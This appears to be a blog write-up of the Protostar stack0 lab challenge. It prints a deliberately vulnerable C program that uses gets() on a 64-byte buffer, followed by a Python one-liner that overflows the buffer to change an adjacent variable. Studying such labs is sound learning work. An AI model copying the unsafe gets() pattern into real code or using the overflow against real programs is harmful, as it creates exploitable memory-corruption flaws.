---
layout: post
title: "Protostar stack00 writeup"
tags: [protostar]
comments: false
---

This challenge is not really a challenge but more of thinking of how memories can be fixed even though the source 
code doens't show any access to it.

First, we are given with a source code.
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```
We can see that it uses the vulnerable 'get' function so we can overwrite buffer and reach to modified.

The total value is 64 so by putting in more value than 64 will reach the modified variable.
```
root@protostar:/opt/protostar/bin# (python -c 'print "A"*65') |./stack0
you have changed the 'modified' variable
```